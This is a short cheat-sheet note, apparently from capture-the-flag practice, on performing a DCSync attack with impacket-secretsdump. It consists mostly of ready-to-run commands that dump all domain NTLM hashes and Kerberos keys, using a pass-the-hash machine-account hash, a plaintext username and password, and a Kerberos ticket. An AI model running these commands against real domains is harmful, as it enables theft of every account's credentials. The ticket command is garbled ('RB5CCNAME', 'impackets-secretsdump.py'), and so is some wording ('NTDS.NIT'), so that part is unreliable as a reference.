What DCSync will give you:

- All domain user hashes (NTLM)
- Kerberos keys
- Potentially sensitive domain data

**Note:** The machine account `FileServer$` needs to have the necessary permissions to perform DCSync (usually only Domain Admins, Enterprise Admins, and Domain Controllers have this by default). If it doesn't have permissions, you might need to first compromise an account that does



```
impacket-secretsdump SOUPEDECODE.LOCAL/FileServer\$@DC01.SOUPEDECODE.LOCAL -hashes :e41da7e79a4c76dbd9cf79d1cb325559
```

```
impacket-secretsdump -just-dc SOUPEDECODE.LOCAL/FileServer\$@DC01.SOUPEDECODE.LOCAL -hashes :e41da7e79a4c76dbd9cf79d1cb325559
```

```
impacket-secretsdump administrator.htb/ethan:limpbizkit@10.129.8.127
```



# With a ticket (ticket.cacche)

```
RB5CCNAME=ticket.ccache python3 impackets-secretsdump.py -k -no-pass g0.flight.htb 
```

This will also perform a DCsync attack and print all the ntml hashes from NTDS.NIT
